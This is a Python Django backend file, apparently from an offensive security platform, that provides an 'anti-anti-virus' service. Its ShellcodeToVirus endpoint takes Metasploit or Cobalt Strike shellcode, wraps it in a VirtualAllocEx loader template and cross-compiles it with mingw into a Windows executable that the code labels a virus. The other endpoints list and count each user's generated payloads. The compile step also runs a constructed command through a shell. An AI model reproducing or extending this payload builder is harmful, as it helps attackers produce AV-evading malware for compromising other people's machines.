import subprocess
import time
import json
import sys
from ClassCongregation import ErrorLog,GetTempFilePath,GetVirusFilePath
from Web.WebClassCongregation import UserInfo,AntiAntiVirusData
from django.http import JsonResponse
from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
from ClassCongregation import randoms
from Web.AntiAntiVirus.VirusModules import MSF_VirtualAllocEx
from Web.celery import app
@app.task
def CompileCode(Command):#代码编译处理函数
    p = subprocess.call(Command, shell=True)  # 执行生成命令
    Status=""
    if p==0:#执行成功
        Status="1"
    else:
        Status="-1"
    AntiAntiVirusData().UpdateStatus(compilation_status=Status,redis_id=CompileCode.request.id)  # 任务结束后更新状态


"""shellcode_to_virus
{
	"token": "xxx",
	"shellcode":"\xdb\xdb\xdb\xdb\xdb\xdb",
	"shellcode_type":"1"
}
"""

def ShellcodeToVirus(request):#shellcode转换生成病毒
    RequestLogRecord(request, request_api="shellcode_to_virus")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Shellcode = json.loads(request.body)["shellcode"]#shellcode字符串
            ShellcodeType = json.loads(request.body)["shellcode_type"]  # shellcode来着MSF还是CS
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="shellcode_to_virus", uid=Uid)
                TempFilePath = GetTempFilePath().Result()  # temp文件路径
                RandomName = randoms().EnglishAlphabet(5) + str(int(time.time()))  # 随机名称
                VirusOriginalFilePath = TempFilePath + RandomName + ".c"  # 病毒原始文件名
                VirusFileStoragePath = GetVirusFilePath().Result()  # 病毒文件存放路径
                VirusFileGenerationPath = VirusFileStoragePath + RandomName + ".exe"  # 病毒文件生成路径
                if sys.platform == "win32":
                    pass#windows的暂时没测试
                elif sys.platform == "linux":
                    CFile = open(VirusOriginalFilePath, "w+")
                    CFile.write(MSF_VirtualAllocEx.GenerateCode(Shellcode))#获取生成代码后写入文件中
                    CFile.close()
                    Command="i586-mingw32msvc-gcc -mwindows " + VirusOriginalFilePath + " -o " + VirusFileGenerationPath
                    RedisCompileCodeTask=CompileCode.delay(Command)
                    AntiAntiVirusData().Write(uid=Uid,shellcode_type=ShellcodeType,virus_original_file_name=RandomName + ".c",virus_generate_file_name=RandomName + ".exe",compilation_status="0",redis_id=RedisCompileCodeTask.task_id)
                    return JsonResponse({'message': "宝贝任务已下发~", 'code': 200, })
                else:
                    return JsonResponse({'message': "你的电脑不是Windows或者Linux无法使用该功能ლ(•̀ _ •́ ლ)", 'code': 600, })
            else:
                return JsonResponse({'message': "小宝贝这是非法请求哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_AntiAntiVirus_GenerateVirusFiles_ShellcodeToVirus(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""anti_anti_virus_data_query
{
	"token": "xxx",
	"number_of_pages":"20"
}
"""

def AntiAntiVirusDataQuery(request):#个人用户免杀数据查询
    RequestLogRecord(request, request_api="anti_anti_virus_data_query")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            NumberOfPages = json.loads(request.body)["number_of_pages"]  # 页数
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="anti_anti_virus_data_query", uid=Uid)
                AntiAntiVirusDataResult = AntiAntiVirusData().Query(uid=Uid,number_of_pages=NumberOfPages)  # 获取当前用户的个数
                return JsonResponse({'message': AntiAntiVirusDataResult, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_AntiAntiVirus_GenerateVirusFiles_AntiAntiVirusDataQuery(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""anti_anti_virus_data_statistical
{
	"token": "xxx"
}
"""

def AntiAntiVirusDataStatistical(request):#个人用户数据统计
    RequestLogRecord(request, request_api="anti_anti_virus_data_statistical")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="anti_anti_virus_data_statistical", uid=Uid)
                Number=AntiAntiVirusData().StatisticalData(uid=Uid)#获取当前用户的个数
                return JsonResponse({'message': Number, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_AntiAntiVirus_GenerateVirusFiles_AntiAntiVirusDataStatistical(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })